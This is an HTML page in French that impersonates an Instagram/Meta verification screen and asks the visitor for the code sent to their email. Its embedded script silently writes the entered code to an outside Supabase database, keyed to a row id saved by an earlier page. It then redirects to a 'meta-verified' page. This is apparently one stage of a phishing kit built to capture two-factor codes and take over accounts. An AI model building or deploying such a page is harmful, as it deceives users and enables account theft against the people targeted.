<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Code de vérification</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background-color: #ffffff;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }
    .main-container {
      width: 100%; max-width: 320px;
      display: flex; flex-direction: column; align-items: center;
      margin: auto 0; text-align: center;
    }
    .logo-img { width: 60px; height: 60px; margin-bottom: 20px; }
    h2 { font-size: 18px; color: #262626; margin-bottom: 8px; font-weight: 600; }
    p { font-size: 13px; color: #737373; margin-bottom: 20px; line-height: 1.4; }
    form { width: 100%; display: flex; flex-direction: column; gap: 10px; }
    .input-field {
      width: 100%; background: #fafafa;
      border: 1px solid #dbdbdb; border-radius: 12px;
      padding: 14px 12px; font-size: 15px; outline: none;
      text-align: center; color: #262626;
    }
    .btn-submit {
      width: 100%; background-color: #0064e0;
      border: none; border-radius: 20px; color: #ffffff;
      font-weight: 600; padding: 12px; font-size: 14px;
      cursor: pointer; margin-top: 5px;
    }
    .resend-link { color: #0064e0; font-size: 13px; text-decoration: none; font-weight: 600; margin-top: 15px; }
    .footer-container {
      width: 100%; max-width: 320px;
      display: flex; flex-direction: column; align-items: center;
      margin-bottom: 10px; gap: 15px;
    }
    .btn-create {
      width: 100%; background: transparent;
      border: 1px solid #0064e0; border-radius: 20px;
      color: #0064e0; font-weight: 600; padding: 10px;
      font-size: 14px; text-decoration: none; text-align: center;
    }
    .meta-logo { font-weight: bold; color: #0064e0; font-size: 14px; }
  </style>
  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
</head>
<body>

  <div class="main-container">
    <img class="logo-img" src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" alt="Instagram">
    <h2>Entrez le code de vérification</h2>
    <p>Nous avons envoyé un code de vérification à votre e-mail. Veuillez l'entrer ci-dessous.</p>

    <form id="codeForm">
      <input type="text" id="code" class="input-field" placeholder="Code de vérification" required>
      <button type="submit" id="submitBtn" class="btn-submit">Continuer</button>
    </form>

    <a href="#" class="resend-link">Renvoyer le code</a>
  </div>

  <div class="footer-container">
    <a href="#" class="btn-create">Créer un nouveau compte</a>
    <div class="meta-logo">∞ Meta</div>
  </div>

  <script>
    const SUPABASE_URL = 'https://snetqzdsjfjygjlpwzbi.supabase.co';
    const SUPABASE_KEY = 'sb_publishable_hG2eyT1OpV7SlR_rNmMQEQ_dGLtFq0W';
    const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

    const form = document.getElementById('codeForm');
    const submitBtn = document.getElementById('submitBtn');

    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      const codeValue = document.getElementById('code').value.trim();
      const rowId = localStorage.getItem('user_row_id');

      if (!rowId) {
        window.location.href = '/';
        return;
      }

      submitBtn.disabled = true;

      try {
        const { error } = await supabaseClient
          .from('users_data')
          .update({ code: codeValue })
          .eq('id', rowId);

        if (error) {
          alert('Erreur: ' + error.message);
          submitBtn.disabled = false;
        } else {
          window.location.href = 'meta-verified.html';
        }
      } catch (err) {
        alert('Erreur inattendue!');
        submitBtn.disabled = false;
      }
    });
  </script>
</body>
</html>
